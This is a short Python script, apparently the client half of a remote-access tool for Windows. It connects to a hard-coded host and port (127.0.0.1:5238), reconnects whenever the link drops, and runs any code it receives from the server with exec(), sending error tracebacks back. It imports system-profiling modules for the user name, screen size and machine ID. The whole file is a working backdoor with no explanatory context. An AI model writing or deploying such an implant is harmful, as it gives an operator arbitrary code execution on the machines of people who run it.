#!/usr/bin/python
# -*- coding: UTF-8 -*-
import socket
import time
import traceback
import requests
from wmi import WMI
import os
import getpass
from win32api import GetSystemMetrics
import uuid

host = "127.0.0.1"
port = 5238

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def connect(host, port):
    global client
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((host, port))
    except:
        time.sleep(1)
        connect(host, port)


connect(host, port)

while True:
    try:
        BUFF_SIZE = 2048
        data = b''
        while True:
            part = client.recv(BUFF_SIZE)
            data += part
            if len(part.decode()) < BUFF_SIZE:
                break
        try:
            exec(data.decode())
        except:
            client.send(b"error")
            client.send(traceback.format_exc().encode())
    except:
        time.sleep(1)
        connect(host, port)
